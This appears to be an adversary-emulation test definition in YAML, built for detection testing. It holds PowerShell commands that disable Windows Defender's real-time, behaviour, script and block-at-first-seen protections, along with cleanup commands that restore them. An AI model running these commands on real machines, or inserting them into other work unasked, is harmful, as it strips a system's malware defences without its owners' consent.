- id: 971a17de-02e8-5b8c-b483-3c6b3cbdd271
  name: Soumaia ART Tests - Tamper with Windows Defender ATP PowerShell
  description: 'Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled

    in Windows settings. (requires elevation)'
  tactic: defense-impairment
  technique:
    attack_id: T1685
    name: Disable or Modify Tools
  platforms:
    windows:
      psh:
        command: |-
          Set-MpPreference -DisableRealtimeMonitoring 1
          Set-MpPreference -DisableBehaviorMonitoring 1
          Set-MpPreference -DisableScriptScanning 1
          Set-MpPreference -DisableBlockAtFirstSeen 1
        cleanup: |-
          Set-MpPreference -DisableRealtimeMonitoring 0
          Set-MpPreference -DisableBehaviorMonitoring 0
          Set-MpPreference -DisableScriptScanning 0
          Set-MpPreference -DisableBlockAtFirstSeen 0
